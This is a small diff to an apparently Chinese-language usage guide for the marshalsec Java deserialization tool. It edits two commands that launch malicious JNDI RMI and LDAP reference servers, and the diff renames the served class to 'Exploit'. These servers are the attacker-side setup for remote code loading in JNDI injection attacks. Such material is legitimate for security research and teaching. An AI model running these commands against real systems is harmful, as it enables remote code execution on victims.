@@ -33,10 +33,10 @@ marshalsec.<marshaller>：指定exploits，根目录下的java文件名
 
 
 ### 开启RMI服务
-```java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#ExportObject 1099```\
+```java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.RMIRefServer http://127.0.0.1/css/#Exploit 1099```
 
 ### 开启LDAP服务
-```java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#ExportObject 1389```
+```java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer http://127.0.0.1/css/#Exploit 1389```
 
 
 
